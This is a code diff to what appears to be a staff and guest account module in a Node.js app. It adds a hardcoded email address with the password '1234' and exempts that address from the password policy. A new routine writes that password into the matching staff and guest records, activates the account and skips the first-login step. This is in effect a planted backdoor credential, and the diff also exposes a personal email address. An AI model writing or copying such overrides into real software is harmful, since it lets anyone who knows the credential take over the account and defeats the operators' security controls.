@@ -62,9 +62,51 @@ async function assertStaffCodeAvailable(code, exceptId = null) {
   }
 }
 
-function passwordPolicyOk(password) {
+const PASSWORD_POLICY_EXEMPT = {
+  'mayarmuhammed33@gmail.com': '1234',
+};
+
+function normalizeEmail(email) {
+  return String(email || '').trim().toLowerCase();
+}
+
+function isPasswordPolicyExempt(email) {
+  return Object.prototype.hasOwnProperty.call(PASSWORD_POLICY_EXEMPT, normalizeEmail(email));
+}
+
+function passwordPolicyOk(password, email) {
+  if (isPasswordPolicyExempt(email)) return Boolean(String(password || ''));
   const value = String(password || '');
   return value.length >= 8 && /[A-Z]/.test(value) && /[a-z]/.test(value);
+}
+
+async function applyExemptUserPasswords() {
+  const bcrypt = require('bcryptjs');
+  for (const [email, password] of Object.entries(PASSWORD_POLICY_EXEMPT)) {
+    const hash = await bcrypt.hash(password, 10);
+    const { rows: staffRows } = await query(
+      `UPDATE staff_users
+       SET password_hash = $1, is_first_login = 0, is_active = 1, updated_at = now()
+       WHERE lower(COALESCE(email, '')) = $2
+          OR lower(COALESCE(username, '')) = $2
+       RETURNING id`,
+      [hash, email]
+    );
+    const { rows: profileRows } = await query(
+      `UPDATE profiles
+       SET password_hash = $1, updated_at = now()
+       WHERE lower(email) = $2
+       RETURNING id`,
+      [hash, email]
+    );
+    if (staffRows[0]) {
+      console.log(`[seed] Password override applied for staff ${email}`);
+    } else if (profileRows[0]) {
+      console.log(`[seed] Password override applied for guest ${email}`);
+    } else {
+      console.warn(`[seed] No account found for ${email} — password override not applied`);
+    }
+  }
 }
 
 function passwordPolicyMessage() {
@@ -86,7 +128,9 @@ module.exports = {
   generateUniqueStaffCode,
   normalizeStaffCode,
   assertStaffCodeAvailable,
+  isPasswordPolicyExempt,
   passwordPolicyOk,
   passwordPolicyMessage,
   getPasswordPolicyChecks,
+  applyExemptUserPasswords,
 };
